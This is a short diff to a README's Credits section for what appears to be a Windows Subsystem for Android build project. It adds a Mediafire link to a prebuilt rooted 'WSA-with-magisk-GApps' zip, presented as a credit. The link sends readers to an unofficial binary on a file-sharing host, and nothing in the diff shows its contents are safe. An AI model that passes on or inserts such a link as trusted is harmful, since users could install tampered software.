@@ -170,7 +170,7 @@
 ---
 
 ## Credits
-
+- [zipfile download](https://www.mediafire.com/file/pl688w8lpyohm5b/WSA-with-magisk-GApps-pico_1.8.32837.0_x64_Release-Nightly_3.zip/file): downloading WSA
 - [StoreLib](https://github.com/StoreDev/StoreLib): API for downloading WSA
 - [Magisk](https://github.com/topjohnwu/Magisk): The most famous root solution on Android
 - [The Open GApps Project](https://opengapps.org): One of the most famous Google Apps packages solution
